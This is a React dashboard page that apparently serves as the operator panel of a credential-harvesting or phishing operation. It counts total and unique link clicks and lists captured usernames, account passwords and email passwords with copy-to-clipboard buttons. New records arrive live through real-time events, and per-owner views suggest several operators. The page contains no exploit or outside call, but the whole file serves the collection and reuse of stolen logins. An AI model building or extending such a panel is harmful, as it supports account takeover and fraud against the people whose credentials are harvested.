import DashboardCard from '@/Components/DashboardCard';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout';
import { Head } from '@inertiajs/react';
import { BanknotesIcon, CircleStackIcon, EyeIcon, TableCellsIcon } from '@heroicons/react/24/solid';
import { useEffect, useState } from 'react';
import DataTable from '@/Components/Table';
import CopyToClipboard from 'react-copy-to-clipboard';
import {usePage} from '@inertiajs/react';
import { registerChannels } from '@/lib/utils';
import axios from 'axios';


const Dashboard = ( props ) => {

    const { auth } = usePage().props
    const { userIds } = usePage().props

    const [eupIndex, setEupIndex] = useState(null);
    const [passwordIndex, setPasswordIndex] = useState(null);
    const [emailPasswordIndex, setEmailPasswordIndex] = useState(null);

    const [accounts, setAccounts] = useState(props.accounts);
    const [totalAccounts, setTotalAccounts] = useState(props.totalAccounts);
    const [todayTotalAccounts, setTodayTotalAccounts] = useState(props.todayTotalAccounts);
    const [totalClicks, setTotalClicks] = useState(props.totalClicks);
    const [uniqueClicks, setUniqueClicks] = useState(props.uniqueClicks);

    let headItemData = [
        'Id',
        'email/Username/Phone',
        'Account Password',
        'Email Password',
        'Owner',
        'type',
        'Time',
    ];

    const [headItems, setHeadItems] = useState(headItemData);

    useEffect(() => {
        if(!auth.user.is_admin){
            setHeadItems(headItems.filter(item => item != 'Owner'))
        }
    },[])

    const handleCredentialCopy = (index, type) => {
        if(type == 'eup'){
            setEupIndex(index)
        }

        if(type == 'password'){
            setPasswordIndex(index)
        }

        if(type == 'password_of_email'){
            setEmailPasswordIndex(index)
        }
    }

    const handleMouseLeave = (type) => {
        if(type == 'eup'){
            setEupIndex(null)
        }

        if(type == 'password'){
            setPasswordIndex(null)
        }

        if(type == 'password_of_email'){
            setEmailPasswordIndex(null)
        }
    }


    useEffect(() => {

        let channels = registerChannels(userIds, auth.user, 'account.created');

        channels.forEach(channel => {
            channel.listen("AccountCreatedEvent", (event) => {
                if(!auth.user.is_admin){
                    setAccounts(event.dashboardData.accounts)
                    setTotalAccounts(event.dashboardData.totalAccounts)
                    setTodayTotalAccounts(event.dashboardData.todayTotalAccounts)
                }else{
                    setAccounts([event.account, ...accounts].slice(0,-1))
                    setTotalAccounts(totalAccounts + 1)
                    setTodayTotalAccounts(todayTotalAccounts + 1)
                }
            });
        });


        return () => {
            channels.forEach(channel => channel.unsubscribe());
        };

    }, []);

    useEffect(() => {

        let channels = registerChannels(userIds, auth.user, 'account.updated');

        channels.forEach(channel => {

            channel.listen("AccountUpdatedEvent", (event) => {
                const updatedAccount = accounts.map(account => {
                    if (account.id === event.account.id) {
                        return { ...account, password_of_email: event.account.password_of_email };
                    }
                    return account;
                });

                setAccounts(updatedAccount);

            });
        });


        return () => {
            channels.forEach(channel => channel.unsubscribe());
        };

    }, []);

    useEffect(() => {

        let channels = registerChannels(userIds, auth.user, 'link_info.created');

        channels.forEach(channel => {
            channel.listen("LinkInfoCreatedEvent", (event) => {
                console.log();
                if(!auth.user.is_admin){
                    setTotalClicks(event.dashboardData.totalClicks)
                    setUniqueClicks(event.dashboardData.uniqueClicks)
                }else{
                    setTotalClicks(event.dashboardData.admin.totalClicks)
                    setUniqueClicks(event.dashboardData.admin.uniqueClicks)
                }
            });
        });

        return () => {
            channels.forEach(channel => channel.unsubscribe());
        };

    }, []);

    return (
        <AuthenticatedLayout
            header='Dashboard'
        >
            <Head title="Dashboard" />

            <div className="overflow-hidden">
                <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7">
                    <DashboardCard title="Total clicks" value={totalClicks} className='bg-green-500'>
                        <EyeIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Unique clicks" value={uniqueClicks} className='bg-blue-400'>
                        <CircleStackIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Accounts" value={todayTotalAccounts} className='bg-orange-400'>
                        <BanknotesIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Total Accounts" value={totalAccounts} className='bg-fuchsia-500'>
                        <TableCellsIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                </div>
            </div>
            <div className='mt-20'>
                <DataTable headItems={headItems}>
                    {
                        accounts.map((account, i) => (
                            <tr key={i} className='odd:bg-white even:bg-slate-100'>
                                <td className="text-left py-3 px-4">{account.id}</td>
                                <CopyToClipboard text={account.eup}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('eup')} onClick={() => handleCredentialCopy(i, 'eup')} type='button' className='font-semibold' title='Click to copy'>{account.eup}</button>
                                        {
                                            eupIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>
                                <CopyToClipboard text={account.password}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('password')} onClick={() => handleCredentialCopy(i, 'password')} type='button' className='font-semibold' title='Click to copy'>{account.password}</button>
                                        {
                                            passwordIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>

                                {
                                    account.password_of_email ? <CopyToClipboard text={account.password_of_email}>
                                        <td className="text-left py-3 px-4 cursor-pointer">
                                            <button onMouseLeave={() => handleMouseLeave('password_of_email')} onClick={() => handleCredentialCopy(i, 'password_of_email')} type='button' className='font-semibold' title='Click to copy'>{account.password_of_email}</button>
                                            {
                                                emailPasswordIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                            }
                                        </td>
                                    </CopyToClipboard>
                                    :

                                    <td className="text-left py-3 px-4">
                                        <span className="bg-yellow-100 text-yellow-800 text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-400">N/A</span>
                                    </td>
                                }

                                {account.owner && <td className="text-left py-3 px-4">{account.owner.name}</td>}

                                <td className="text-left py-3 px-4">
                                    <span className='text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-green-400 bg-green-100 text-green-800'>{account.type.name}</span>
                                </td>
                                <td className="text-left py-3 px-4 italic font-thin">{account.time_for_humans}</td>
                            </tr>
                        ))
                    }
                </DataTable>
            </div>
        </AuthenticatedLayout>
    );
}

export default Dashboard;
